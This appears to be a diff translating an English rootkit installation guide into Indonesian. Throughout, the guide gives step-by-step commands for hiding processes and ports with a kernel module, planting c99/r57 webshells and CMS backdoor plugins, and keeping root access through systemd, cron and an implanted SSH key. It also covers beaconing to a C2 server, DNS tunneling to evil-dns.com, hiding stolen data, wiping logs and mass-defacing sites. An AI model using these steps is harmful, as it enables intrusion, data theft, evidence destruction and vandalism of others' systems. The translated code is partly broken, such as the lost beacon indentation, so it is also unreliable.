@@ -1,47 +1,47 @@
-INSTALL.md
-Inti Rootkit: Installation & Deployment Guide
+Panduan Instalasi & Deployment Inti Rootkit
 
-Version: 1.0 (ELITE_BLACKHAT_BUILD)
-Target OS: Linux (Kernel Module), Windows (API Hooking), Web Servers (PHP/JS)
-Difficulty: Advanced
-Prerequisites: Root/Sudo access, GCC/Make, Python 3, Node.js (optional for spray tools)
+Versi: 1.0 (ELITE_BLACKHAT_BUILD)
+Sistem Operasi Target: Linux (Modul Kernel), Windows (Hooking API), Server Web (PHP/JS)
+Tingkat Kesulitan: Lanjutan
+Prasyarat: Akses Root/Sudo, GCC/Make, Python 3, Node.js (opsional untuk alat semprot)
 
-1. Prerequisite Verification
+Verifikasi Prasyarat
 
-Before installation, ensure the target environment meets the following requirements. This rootkit is designed to be modular; you can install components individually or the full suite.
+Sebelum instalasi, pastikan lingkungan target memenuhi persyaratan berikut. Rootkit ini dirancang agar modular; Anda dapat menginstal komponen secara individual atau seluruh paket.
 
-System Requirements
-Linux Kernel: 4.x - 6.x (for kernel_module.ko)
-Windows: Windows 10/11 or Server 2019+ (for hook.dll + loader.exe)
-Web Server: Apache/Nginx with PHP support (for webshell/payloads)
-Dependencies:
+Persyaratan Sistem
+Kernel Linux: 4.x - 6.x (untuk kernel_module.ko)
+Windows: Windows 10/11 atau Server 2019+ (untuk hook.dll + loader.exe)
+Server Web: Apache/Nginx dengan dukungan PHP (untuk webshell/payload)
+Dependensi:
 build-essential, linux-headers-generic (Linux)
 python3, pip3
 curl, wget
 gcc, make
-Directory Structure Setup
+Pengaturan Struktur Direktori
 
-Ensure the directory structure matches the attached file tree. If deploying from a clean zip/tarball, extract it to /opt/inti_rootkit/ or your preferred location.
+Pastikan struktur direktori sesuai dengan pohon file yang terlampir. Jika melakukan penyebaran dari zip/tarball bersih, ekstrak ke /opt/inti_rootkit/ atau lokasi pilihan Anda.
 
 bash
 Download
 Copy
 mkdir -p /opt/inti_rootkit/{CORE,STEGO,PAYLOADS,PERSISTENCE,C2_SERVER,LOG_TAMPER,DEFACE_TOOLS,EXPLOITS,DETECTION_EVASION,REPORTS}
-# Copy files here...
-2. Phase 1: Core Persistence (Linux Kernel Module)
 
-This section installs the kernel-level rootkit for deep system hiding.
+Salin file di sini...
+Fase 1: Persistensi Inti (Modul Kernel Linux)
 
-Step 2.1: Compile the Kernel Module
+Bagian ini menginstal rootkit tingkat kernel untuk penyembunyian sistem yang mendalam.
 
-Navigate to the CORE directory:
+Langkah 2.1: Kompilasi Modul Kernel
+
+Buka direktori CORE:
 
 bash
 Download
 Copy
 cd /opt/inti_rootkit/CORE
 
-Check if the kernel headers match your running kernel:
+Periksa apakah header kernel sesuai dengan kernel yang sedang berjalan:
 
 bash
 Download
@@ -49,32 +49,34 @@ Copy
 uname -r
 ls -l /lib/modules/$(uname -r)/build
 
-If headers are missing, install them:
+Jika header hilang, pasang:
 
 bash
 Download
 Copy
 sudo apt-get update && sudo apt-get install linux-headers-$(uname -r) build-essential
 
-Compile the module (kernel_module.ko):
+Kompilasi modul (kernel_module.ko):
 
 bash
 Download
 Copy
 make
-# If no Makefile exists, use manual compilation:
+
+Jika tidak ada Makefile, gunakan kompilasi manual:
+
 gcc -c kernel_module.c -o kernel_module.o
 ld -r -o kernel_module.ko kernel_module.o
-Step 2.2: Install and Load the Module
+Langkah 2.2: Pasang dan Muat Modul
 
-Insert the module into the kernel:
+Masukkan modul ke dalam kernel:
 
 bash
 Download
 Copy
 sudo insmod kernel_module.ko
 
-Verify it is loaded:
+Verifikasi bahwa modul telah dimuat:
 
 bash
 Download
@@ -82,25 +84,27 @@ Copy
 lsmod | grep inti_rootkit
 dmesg | tail -n 20
 
-Verification: Run ps aux and check if the rootkit processes are hidden. Use netstat or ss to verify hidden ports.
+Verifikasi: Jalankan ps aux dan periksa apakah proses rootkit tersembunyi. Gunakan netstat atau ss untuk memverifikasi port tersembunyi.
 
-Step 2.3: Windows Alternative (If Target is Windows)
-Copy hook.dll and loader.exe to C:\Windows\System32\.
-Open Command Prompt as Administrator.
-Load the DLL via loader:
+Langkah 2.3: Alternatif Windows (Jika Target adalah Windows)
+Salin hook.dll dan loader.exe ke C:\Windows\System32\.
+Buka Command Prompt sebagai Administrator.
+Muat DLL melalui loader:
 
-```cmd
+cmd
+Download
+Copy
 loader.exe --inject hook.dll
-```
 
-Verify API hooks using Process Hacker or similar tool.
-3. Phase 2: Web Payload Deployment
+Verifikasi hook API menggunakan Process Hacker atau alat serupa.
 
-Deploy the defacement payloads and webshells.
+Fase 2: Penyebaran Payload Web
 
-Step 3.1: Deploy Webshells
+Sebarkan payload defacement dan webshell.
 
-Copy the backdoors to the web root directory (e.g., /var/www/html/ or /var/www/public/).
+Langkah 3.1: Deploy Webshell
+
+Salin backdoor ke direktori root web (misalnya, /var/www/html/ atau /var/www/public/).
 
 bash
 Download
@@ -109,18 +113,18 @@ sudo cp PAYLOADS/shell_backdoor.php /var/www/html/shell.php
 sudo cp EXPLOITS/CREDENTIAL_BASED_DEFACEMENT/FTP_WebShell_Upload/c99_shell.php /var/www/html/c99.php
 sudo cp EXPLOITS/CREDENTIAL_BASED_DEFACEMENT/FTP_WebShell_Upload/r57_shell.php /var/www/html/r57.php
 
-Set correct permissions:
+Atur izin yang benar:
 
 bash
 Download
 Copy
 sudo chown www-data:www-data /var/www/html/*.php
 sudo chmod 644 /var/www/html/*.php
-Step 3.2: Inject CSS/JS for Defacement
+Langkah 3.2: Injeksi CSS/JS untuk Defacement
 
-Modify the main index page or inject via a CMS plugin (see Section 5).
+Modifikasi halaman index utama atau injeksikan melalui plugin CMS (lihat Bagian 5).
 
-For direct override:
+Untuk override langsung:
 
 bash
 Download
@@ -128,48 +132,48 @@ Copy
 sudo cp PAYLOADS/css_override.css /var/www/html/assets/css/custom_override.css
 sudo cp PAYLOADS/html_inject.js /var/www/html/assets/js/inject_banner.js
 
-Edit the main HTML template to include these files at the top of the <head> tag.
+Edit template HTML utama untuk menyertakan file-file ini di bagian atas tag <head>.
 
-Step 3.3: CMS Specific Payloads
+Langkah 3.3: Payload Spesifik CMS
 
 WordPress:
 
-Navigate to EXPLOITS/WEB_APP_DEFACEMENT/CMS_Specific_Payloads/wordpress/.
-Upload plugin_backdoor.php as a new plugin in WP Admin.
-Activate the plugin. It will hook into the footer and display the defacement banner.
+Buka EXPLOITS/WEB_APP_DEFACEMENT/CMS_Specific_Payloads/wordpress/.
+Unggah plugin_backdoor.php sebagai plugin baru di WP Admin.
+Aktifkan plugin tersebut. Plugin akan melakukan hook pada footer dan menampilkan banner defacement.
 
 Joomla:
 
-Upload component_exploit.php via Joomla's extension manager.
+Unggah component_exploit.php melalui manajer ekstensi Joomla.
 
 Drupal:
 
-Apply the patch if vulnerable to Drupalgeddon (CVE-2018-7602):
+Terapkan patch jika rentan terhadap Drupalgeddon (CVE-2018-7602):
 
-```bash
+bash
+Download
+Copy
 bash drupalgeddon_patch.sh
-```
+Fase 3: Mekanisme Persistensi
 
-4. Phase 3: Persistence Mechanisms
+Pastikan rootkit bertahan setelah reboot dan restart layanan.
 
-Ensure the rootkit survives reboots and service restarts.
+Langkah 4.1: Layanan Systemd (Linux)
 
-Step 4.1: Systemd Service (Linux)
-
-Create a systemd service file for auto-start:
+Buat berkas layanan systemd untuk startup otomatis:
 
 bash
 Download
 Copy
 sudo nano /etc/systemd/system/inti-rootkit.service
 
-Add the following content:
+Tambahkan konten berikut:
 
 ini
 Download
 Copy
 [Unit]
-Description=Inti Rootkit Core Service
+Description=Layanan Inti Rootkit Inti
 After=network.target
 
 [Service]
@@ -180,7 +184,7 @@ RestartSec=10
 [Install]
 WantedBy=multi-user.target
 
-Enable and start the service:
+Aktifkan dan mulai layanan:
 
 bash
 Download
@@ -188,17 +192,17 @@ Copy
 sudo systemctl daemon-reload
 sudo systemctl enable inti-rootkit.service
 sudo systemctl start inti-rootkit.service
-Step 4.2: Crontab Backup
+Langkah 4.2: Cadangan Crontab
 
-Append the rootkit loader to crontab for redundancy:
+Lampirkan loader rootkit ke crontab untuk redundansi:
 
 bash
 Download
 Copy
 echo "@reboot /opt/inti_rootkit/CORE/loader.exe" | sudo tee -a /var/spool/cron/crontabs/root
-Step 4.3: SSH Key Backdoor
+Langkah 4.3: Backdoor Kunci SSH
 
-Add the public key for passwordless access:
+Tambahkan kunci publik untuk akses tanpa kata sandi:
 
 bash
 Download
@@ -208,87 +212,91 @@ sudo cp PERSISTENCE/ssh_keys.pub /root/.ssh/authorized_keys
 sudo chmod 600 /root/.ssh/authorized_keys
 sudo chmod 700 /root/.ssh
 
-Verify connectivity from another machine:
+Verifikasi konektivitas dari mesin lain:
 
 bash
 Download
 Copy
 ssh -i private_key root@target_ip
-5. Phase 4: C2 Communication Setup
 
-Configure the Command & Control beacon.
+Fase 4: Pengaturan Komunikasi C2
 
-Step 5.1: Configure Beacon
+Konfigurasi suara C2.
+
+Langkah 5.1: Konfigurasi Beacon
 
 Edit C2_SERVER/beacon.py:
 
 python
 Download
 Copy
-# beacon.py
+
+beacon.py
+
 import socket
 import time
 
-C2_IP = "192.168.1.100"  # Change to your C2 server IP
+C2_IP = "192.168.1.100" # Ubah ke IP server C2 Anda
 C2_PORT = 443
-INTERVAL = 60  # Seconds between beacons
+INTERVAL = 60 # Detik antara suara
 
 def send_beacon():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((C2_IP, C2_PORT))
-    sock.send(b"BEACON_ACTIVE")
-    sock.close()
+sock = socket.socket(socket.AF_INET, SOCK_STREAM)
+sock.connect((C2_IP, C2_PORT))
+sock.send(b"BEACON_ACTIVE")
+sock.close()
 
 while True:
-    send_beacon()
-    time.sleep(INTERVAL)
-Step 5.2: DNS Tunneling Setup
+send_beacon()
+time.sleep(INTERVAL)
+Langkah 5.2: Pengaturan Tunneling DNS
 
-Use dns_tunnel.sh to bypass firewalls by encoding data in DNS queries:
+Gunakan dns_tunnel.sh untuk melewati firewall dengan mengenkapsulasi data dalam kueri DNS:
 
 bash
 Download
 Copy
 chmod +x C2_SERVER/dns_tunnel.sh
 ./dns_tunnel.sh --domain evil-dns.com --payload "command_output"
-Step 5.3: SSL Certificate for HTTPS C2
+Langkah 5.3: Sertifikat SSL untuk C2 HTTPS
 
-Generate a fake SSL certificate to mask C2 traffic as legitimate HTTPS:
+Hasilkan sertifikat SSL palsu untuk menutupi lalu lintas C2 sebagai HTTPS sah:
 
 bash
 Download
 Copy
-openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl req -x509 -newkey rsa-2048 -keyout key.pem -out cert.pem -days 365 -nodes
 cp cert.pem C2_SERVER/ssl_cert.pem
 
-Update beacon.py to use SSL if required.
+Perbarui beacon.py untuk menggunakan SSL jika diperlukan.
 
-6. Phase 5: Steganography & Data Hiding
+Fase 5: Steganografi & Penyembunyian Data
 
-Hide exfiltrated data inside media files.
+Sembunyikan data yang diekstraksi ke dalam file media.
 
-Step 6.1: Encrypt and Hide Data
+Langkah 6.1: Enkripsi dan Sembunyikan Data
 
-Use steg_decrypt.py to hide data in images or audio:
+Gunakan steg_decrypt.py untuk menyembunyikan data dalam gambar atau audio:
 
 bash
 Download
 Copy
 python3 STEGO/steg_decrypt.py --hide --input secret_data.txt --carrier img_steg.png --output stego_img.png
 
-To extract later:
+Untuk mengekstrak nanti:
 
 bash
 Download
 Copy
 python3 STEGO/steg_decrypt.py --extract --input stego_img.png --output extracted_data.txt
-7. Phase 6: Anti-Forensics & Log Tampering
 
-Clean up traces after installation.
+Fase 6: Anti-Forensik & Manipulasi Log
 
-Step 7.1: Clean Logs
+Bersihkan jejak setelah instalasi.
 
-Run the log tampering scripts:
+Langkah 7.1: Bersihkan Log
+
+Jalankan skrip manipulasi log:
 
 bash
 Download
@@ -298,46 +306,49 @@ chmod +x LOG_TAMPER/auth_log_rotate.sh
 
 ./LOG_TAMPER/bash_history_clean.sh
 ./LOG_TAMPER/auth_log_rotate.sh
-Step 7.2: Clear WTMP
+Langkah 7.2: Hapus WTMP
 
-Remove last login records:
+Hapus catatan login terakhir:
 
 bash
 Download
 Copy
 sudo python3 LOG_TAMPER/wtmp_cleaner.py
-8. Phase 7: Defacement Tools Execution
 
-Spray defacement pages across multiple subdomains if needed.
+Fase 7: Eksekusi Alat Defacement
 
-Step 8.1: Spray Tool
+Semprotkan halaman defacement ke beberapa subdomain jika diperlukan.
 
-Use the spray tool to inject banners into multiple targets:
+Langkah 8.1: Alat Semprot
+
+Gunakan alat semprot untuk menyuntikkan banner ke beberapa target:
 
 bash
 Download
 Copy
 chmod +x DEFACE_TOOLS/spray_tool.py
 python3 DEFACE_TOOLS/spray_tool.py --targets target_list.txt --payload matrix_rain.html
-Step 8.2: Manual Defacement
+Langkah 8.2: Defacement Manual
 
-Replace the main index page:
+Ganti halaman index utama:
 
 bash
 Download
 Copy
 sudo cp EXPLOITS/WEB_APP_DEFACEMENT/Direct_File_Override/index.php.defaced /var/www/html/index.php
-9. Phase 8: Verification & Cleanup
-Step 9.1: Verify Installation
-Check kernel module: lsmod | grep inti
-Check systemd service: systemctl status inti-rootkit
-Check cron jobs: crontab -l
-Check SSH keys: cat /root/.ssh/authorized_keys
-Check webshells: Browse to http://target/shell.php
-Check C2 beacon: Monitor your C2 server logs.
-Step 9.2: Remove Traces (Optional)
 
-To uninstall:
+Fase 8: Verifikasi & Pembersihan
+
+Langkah 9.1: Verifikasi Instalasi
+Periksa modul kernel: lsmod | grep inti
+Periksa layanan systemd: systemctl status inti-rootkit
+Periksa pekerjaan cron: crontab -l
+Periksa kunci SSH: cat /root/.ssh/authorized_keys
+Periksa webshell: Jelajahi http://target/shell.php
+Periksa suara C2: Pantau log server C2 Anda.
+Langkah 9.2: Hapus Jejak (Opsional)
+
+Untuk uninstall:
 
 bash
 Download
@@ -348,13 +359,16 @@ sudo rm /etc/systemd/system/inti-rootkit.service
 sudo crontab -r
 sudo rm /root/.ssh/authorized_keys
 sudo rm /var/www/html/shell.php /var/www/html/c99.php /var/www/html/r57.php
-10. Troubleshooting
-Module not loading: Ensure kernel headers match. Check dmesg for errors.
-Webshell 404: Verify file permissions and web server user ownership.
-C2 not connecting: Check firewall rules on both ends. Ensure C2 IP is correct in beacon.py.
-Log not cleaning: Run scripts manually with sudo to ensure permissions are correct.
 
-End of Installation Guide.
-Rootkit is now active. Stay hidden.
+Pemecahan Masalah
 
-By Dwi Joko Purwanto
+Modul tidak bermuatan: Pastikan header kernel cocok. Periksa dmesg untuk kesalahan.
+Webshell 404: Verifikasi izin file dan kepemilikan pengguna server web.
+C2 tidak terhubung: Periksa aturan firewall di kedua sisi. Pastikan IP C2 benar di beacon.py.
+Log tidak dibersihkan: Jalankan skrip secara manual dengan sudo untuk memastikan izin benar.
+
+Akhir Panduan Instalasi.
+Rootkit sekarang aktif. Tetap tersembunyi.
+
+Oleh Dwi Joko Purwanto
+
